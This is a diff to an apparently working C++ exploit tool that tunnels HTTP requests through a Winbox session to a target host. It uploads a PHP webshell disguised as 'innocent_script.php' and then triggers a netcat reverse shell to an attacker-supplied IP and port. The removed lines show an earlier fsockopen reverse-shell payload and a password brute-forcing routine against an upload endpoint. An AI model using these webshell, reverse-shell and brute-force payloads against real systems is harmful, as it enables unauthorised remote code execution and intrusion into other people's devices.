@@ -140,13 +140,33 @@ namespace
         msg.set_command(1);
         msg.set_request_id(1);
         msg.set_reply_expected(true);
-        msg.add_string(7, "POST /upload.php HTTP/1.1\r\nHost:" + p_address + "\r\nContent-Type:multipart/form-data; boundary=b\r\n\r\n--b\r\nContent-Disposition:form-data;name=fileToUpload;filename=rsk.php\r\n\r\n<?php system($_GET['a']);?>\r\n--b\r\nContent-Disposition:form-data;name=submit\r\n\r\nUpload File\r\n--b\n");
-        //msg.add_string(7, "POST /upload.php HTTP/1.1\r\nHost:" + p_address + "\r\nContent-Type:multipart/form-data;boundary=a\r\nContent-Length:96\r\n\r\n--a\nContent-Disposition:form-data;name=userfile;filename=a.php\n\n<?php system($_GET['a']);?>\n--a\n");
+
+        const std::string sessionId = "8f14e45fceea167a5a36dedd4bea2543";
+
+        const std::string uploadRequest = 
+        "POST /api_upload.php HTTP/1.1\r\n"
+        "Host: "+p_address+"\r\n"
+        "User-Agent: curl/7.81.0\r\n"
+        "Accept: */*\r\n"
+        "Cookie: PHPSESSID="+sessionId+"\r\n"
+        "Content-Length: 240\r\n"
+        "Content-Type: multipart/form-data; boundary=--------------------------bd5ee0ac0e873341\r\n"
+        "\r\n"
+        "----------------------------bd5ee0ac0e873341\r\n"
+        "Content-Disposition: form-data; name=\"file\"; filename=\"innocent_script.php\"\r\n"
+        "Content-Type: application/octet-stream\r\n"
+        "\r\n"
+        "<?php system($_GET['a']);?>..\r\n"
+        "----------------------------bd5ee0ac0e873341--\r\n";
+
+        std::cout << "[+] Raw request string: " << uploadRequest << std::endl;
+
+        msg.add_string(7, uploadRequest);
         msg.add_string(8, "200 OK");
         msg.add_u32(3, p_converted_address);
         msg.add_u32(4, p_converted_port);
 
-        std::cout << msg.serialize_to_json() << std::endl;
+        std::cout << "[+] Request:" << msg.serialize_to_json() << std::endl;
 
         session.send(msg);
         msg.reset();
@@ -156,6 +176,8 @@ namespace
             std::cerr << "Error receiving a response." << std::endl;
             return false;
         }
+
+        std::cout << "[+] Reply:" << msg.serialize_to_json()<< std::endl;
 
         if (msg.has_error())
         {
@@ -175,13 +197,11 @@ namespace
         msg.set_command(1);
         msg.set_request_id(1);
         msg.set_reply_expected(true);
-        msg.add_string(7, "GET /rsk.php?a=php+-r+%27%24sock%3Dfsockopen%28%22"+p_reverse_ip+"%22%2C"+p_reverse_port+"%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27 HTTP/1.1\r\nHost:" + p_address + "\r\n\r\n");
-        //msg.add_string(7, "GET /rsk.php?a=ls+/bin/+%3E+logk.txt HTTP/1.1\r\nHost:" + p_address + "\r\n\r\n");
-        
+
+        msg.add_string(7, "GET /innocent_script.php?a=(nc%20" + p_reverse_ip + "%20" + p_reverse_port + "%20-e%20/bin/sh)%26 HTTP/1.1\r\nHost:a\r\n\r\n");
         msg.add_string(8, "200 OK");
         msg.add_u32(3, p_converted_address);
         msg.add_u32(4, p_converted_port);
-
 
         std::cout << "[+] Request:" << msg.serialize_to_json() << std::endl;
 
@@ -204,48 +224,6 @@ namespace
 
         return msg.get_boolean(0xd);
     }
-}
-
-std::string bang_passwords(Winbox_Session &session, std::string &p_address, boost::uint32_t p_converted_address,
-                           boost::uint32_t p_converted_port)
-{
-    const std::string passwordList("common_passwords.txt");
-    std::ifstream reader{};
-    reader.open(passwordList);
-
-    std::stringstream ss;
-    ss << reader.rdbuf();
-
-    std::string password;
-
-    size_t passCounter = 0;
-    while (std::getline(ss, password))
-    {
-        WinboxMessage msg;
-        msg.set_to(104);
-        msg.set_command(1);
-        msg.set_request_id(1);
-        msg.set_reply_expected(true);
-        msg.add_string(7, "POST /api_upload.php HTTP/1.1\r\nHost:" + p_address + "\r\nAccept: */*\r\nContent-Length: 328\r\nContent-Type: multipart/form-data; boundary=--------------------------37fa95b2c741544e\r\n\r\n--------------------------37fa95b2c741544e\r\nContent-Disposition: form-data; name=\"file\"; filename=\"ps.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php system($_GET['a']);?>\r\n--------------------------37fa95b2c741544e\r\nContent-Disposition: form-data; name=\"key\"\r\n\r\n" + password + "\r\n--------------------------37fa95b2c741544e--\r\n");
-        msg.add_string(8, "200 OK");
-        msg.add_u32(3, p_converted_address);
-        msg.add_u32(4, p_converted_port);
-
-        session.send(msg);
-        msg.reset();
-
-        if (session.receive(msg))
-        {
-            std::cerr << "Valid password:" << password << std::endl;
-            return password;
-        }
-
-        std::cout << "Password #" << passCounter << ":" << password << ";" << msg.get_error_string() << std::endl;
-
-        ++passCounter;
-    }
-
-    return {};
 }
 
 int main(int p_argc, const char **p_argv)
@@ -295,8 +273,6 @@ int main(int p_argc, const char **p_argv)
     {
         return EXIT_SUCCESS;
     }
-
-    //auto validPassword = bang_passwords(winboxSession, target_ip, converted_address, converted_port);
 
     std::cout << "[+] Uploading a webshell" << std::endl;
     if (!upload_webshell(winboxSession, target_ip, converted_address, converted_port))
